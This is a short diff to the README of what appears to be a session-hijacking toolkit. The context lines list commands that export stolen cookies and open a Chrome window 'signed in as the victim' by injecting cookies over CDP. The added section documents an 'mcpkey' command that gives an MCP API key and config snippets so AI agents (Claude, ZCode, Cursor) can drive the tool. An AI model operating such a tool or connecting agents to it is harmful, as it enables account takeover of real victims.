@@ -59,6 +59,13 @@ MCP server — one implementation, no per-tool copies).
 | `export <id> [file]` | cookies → Cookie-Editor extension JSON |
 | `open <id> [--url U] [--fresh] [--headless] [--chrome P] [--port N] [--disable-http2]` | **opens a real Chrome window signed in as the victim** (cookies injected over CDP; `--disable-http2` for login.live.com quirks) |
 
+### MCP key
+
+| Command | Effect |
+|---|---|
+| `mcpkey` | show the MCP API key + ready-made agent config snippets (Claude/ZCode/Cursor) |
+| `mcpkey new` | generate a NEW key (rotates `tools/mcp/mcp.key`; update agent configs) |
+
 ### Proxy & node-side ops
 
 | Command | Effect |
